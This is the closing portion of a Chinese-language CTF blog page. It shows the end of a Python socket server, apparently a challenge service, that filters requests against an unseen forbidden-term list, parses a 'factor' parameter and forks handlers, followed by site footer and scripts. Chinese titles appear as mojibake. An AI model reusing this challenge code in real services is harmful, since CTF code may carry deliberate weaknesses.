</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">server</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">initial_data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">MSG_PEEK</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">term</span> <span class="ow">in</span> <span class="n">initial_data</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="k">for</span> <span class="n">term</span> <span class="ow">in</span> <span class="n">FORBIDDEN</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;HTTP/1.1 403 Forbidden</span><span class="se">\r\n\r\n</span><span class="s2">Suspicious request pattern detected.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">initial_data</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;GET /?log=1&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">factor</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">                <span class="n">pattern</span> <span class="o">=</span> <span class="sa">rb</span><span class="s2">&#34;&amp;factor=(\d+)&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">initial_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="k">match</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">factor</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">                <span class="n">pid</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">fork</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">server</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                    <span class="n">handle_connection</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="kc">True</span><span class="p">,</span> <span class="n">factor</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[ERROR]: &#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">pid</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">fork</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">server</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="n">handle_connection</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/emo/">Emo</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>è°¢è°¢è§‚çœ‹</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/2025-%E6%98%A5%E7%A7%8B%E9%95%BF%E5%9F%8E%E6%9D%AF/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025-æ˜¥ç§‹é•¿åŸæ¯</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025-%E6%B9%BE%E5%8C%BA%E6%9D%AF/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025-æ¹¾åŒºæ¯</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025-%E5%87%BA%E9%A2%98/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025-å‡ºé¢˜</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025-nss-4th/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025-Nss-4th</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025-netdreamctf/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025-NetDreamctf</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src="https://utteranc.es/client.js" 
        repo=""
        issue-term="pathname"
        
        crossorigin="anonymous"
        async
        >
</script>

<style>
    .utterances {
        max-width: unset;
    }
</style>

<script>
    let utterancesLoaded = false;

    function setUtterancesTheme(theme) {
        let utterances = document.querySelector('.utterances iframe');
        if (utterances) {
            utterances.contentWindow.postMessage(
                {
                    type: 'set-theme',
                    theme: `github-${theme}`
                },
                'https://utteranc.es'
            );
        }
    }

    addEventListener('message', event => {
        if (event.origin !== 'https://utteranc.es') return;

        
        utterancesLoaded = true;
        setUtterancesTheme(document.documentElement.dataset.scheme)
    });

    window.addEventListener('onColorSchemeChange', (e) => {
        if (!utterancesLoaded) return;
        setUtterancesTheme(e.detail)
    })
</script>


    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 luokaihong
    </section>
    
    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
